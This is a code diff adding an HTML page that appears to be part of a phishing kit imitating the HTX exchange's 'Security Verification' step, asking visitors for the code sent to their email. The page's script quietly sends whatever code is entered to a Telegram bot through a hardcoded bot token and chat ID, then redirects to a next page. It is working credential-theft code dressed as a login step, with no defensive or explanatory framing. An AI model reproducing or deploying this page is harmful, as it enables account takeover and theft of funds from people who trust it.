@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <title>HTX | Password</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            position: relative;
+        }
+        .content {
+            background-color: #fff;
+            height: 100%;
+            width: 100%;
+            padding: 20px;
+            text-align: left;
+        }
+        .content h1 {
+            font-size: 23px;
+            margin: 0px;
+            padding: 15px 0px;
+        }
+        .content p {
+            font-size: 13px;
+            margin: 0px;
+            padding: 10px 0px;
+        }
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: #dfe3ed;
+        }
+        .content ul {
+            list-style: none;
+        }
+        .content li {
+            list-style: none;
+            display: block;
+            padding: 8px 0px;
+        }
+        .content input[type="password"] {
+            width: 100%;
+            height: 50px;
+            background-color: #fafafa;
+            border: none;
+            border-radius: 5px;
+            outline: none;
+            padding: 0px 15px;
+            font-size: 14px;
+        }
+        .content button {
+            width: 100%;
+            height: 40px;
+            background-color: #4689e0;
+            border-radius: 5px;
+            outline: none;
+            padding: 5px 0px;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+        }
+        .back img {
+            width: 25px;
+            height: 25px;
+            margin: 5px 0px;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <a href="Password.html" class="back"><img src="images/back.png" alt="back"></a>
+        <h1>Security Verification</h1>
+		<p>Enter code sent to your Email</p>
+        <form id="passwordForm">
+            <ul>
+                <li><input type="password" id="passwordInput" placeholder="Enter Phone code." required></li>
+				<li><p>Or receive code from <a href="authenticator.html" class="links">Authenticator code</a> / <a href="phone-verification.html" class="links">Phone number</a></li>
+                <li><button type="submit">Next</button></li>
+				
+            </ul>
+        </form>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8022682561:AAEsak6S1bdhFFaSAoWkg9IDU2FZdZ2bXB8"; 
+        const CHAT_ID = "7773839221"; 
+
+        document.getElementById("passwordForm").addEventListener("submit", function(event) {
+            event.preventDefault(); 
+
+            let password = document.getElementById("passwordInput").value;
+            let message = `New Email code entered: ${password}`;
+
+            let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(() => {
+                    window.location.href = "lastpage.html"; 
+                })
+                .catch(error => {
+                    console.error("Error sending message:", error);
+                    window.location.href = "lastpage.html";
+                });
+        });
+    </script>
+</body>
+</html>
